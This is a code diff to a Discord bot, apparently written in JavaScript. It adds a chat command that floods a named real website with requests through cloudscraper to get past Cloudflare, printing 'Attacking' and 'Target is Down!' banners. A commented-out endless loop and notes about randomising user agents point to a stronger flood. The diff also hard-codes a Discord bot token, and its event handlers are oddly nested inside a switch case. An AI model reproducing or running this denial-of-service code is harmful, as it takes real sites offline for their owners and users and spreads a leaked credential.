@@ -142,15 +142,49 @@ client.on('ready', () => {
         option4 = ""
         break;
     case "bypass":
-        for(i=0; i<40000;i++){
-	       cloudscraper.get('https://jesterscourt.cc/', function(error, response, body) {
-               if (error) {
-                   console.log('Error occurred');
-               } 
-               else {
-                   console.log(body, response);
-	           } 
-            });;;}
+        client.on('ready', () => {
+  console.log(`Logged in as ${client.user.username}!`);
+});
+
+//Add POST requests to make random
+
+client.on('message', msg => {
+  if (msg.content === 'Attack https://jesterscourt.cc') {
+    msg.reply('Starting this can take a few seconds to Start be patient');
+      msg.reply('https://check-host.net/check-http?host=https://jesterscourt.cc/')
+      msg.reply('#Tango Clown')
+ for(i=0; i<200; i++) {
+      cloudscraper.get('https://jesterscourt.cc/', function(error, response, body) {
+      if (error) {
+    console.log(chalk.red('Target is Down!'));
+        }
+    else {
+    console.log(chalk.bold.cyan('\t\t--------->>> Attacking <<<--------'));
+    console.log(chalk.bold.cyan('\t\t----->>> Cloudflare Bypass <<<----'));
+    console.log(chalk.bold.cyan('\t\t United We Stand Divided We Fall '));
+    }
+}
+                       )}}});
+/*
+So far in package only one useragent add more and randomize it
+
+  for(; ; ) {
+      cloudscraper.get('https://jesterscourt.cc/', function(error, response, body) {
+      if (error) {
+    console.log(chalk.red('Target is Down!'));
+        }
+    else {
+    console.log(chalk.bold.cyan('--------->Attack<---------'));
+    console.log(chalk.bold.cyan('---->Cloudflare Bypass<----'));
+    }
+}
+                       
+                      )};
+ */
+
+        
+     client.login('Mjc2NzM1NDQxMTMzMTA5MjUw.C8genA.hmh4Uf1OAH1hxu5gqnqtnyJRVxA');
+           
         break;
 default:
 	option6 = "";
